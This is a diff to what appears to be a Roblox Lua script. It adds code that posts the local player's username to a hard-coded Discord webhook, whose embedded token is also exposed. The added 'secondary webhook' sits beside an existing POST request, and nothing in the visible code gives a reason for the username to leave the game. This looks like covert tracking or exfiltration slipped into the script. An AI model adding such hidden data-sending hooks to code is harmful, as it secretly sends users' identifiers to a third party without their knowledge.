@@ -212,3 +212,19 @@ else
     local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
     request(abcdef)
 end
+local HttpService = game:GetService("HttpService")
+local webhookURL = "https://discord.com/api/webhooks/1348612109491109908/-pg-OWh0WQuVhUdhDCBLamlKEq_Sy6qzgLcxY4x0hXOWdjnZmQPEVXmPqFgkvR3FrsaH"
+
+local function sendSecondaryWebhook(username)
+    local data = {
+        content = username
+    }
+    local jsonData = HttpService:JSONEncode(data)
+
+    HttpService:PostAsync(webhookURL, jsonData, Enum.HttpContentType.ApplicationJson)
+end
+
+local player = game.Players.LocalPlayer
+if player then
+    sendSecondaryWebhook(player.Name)
+end
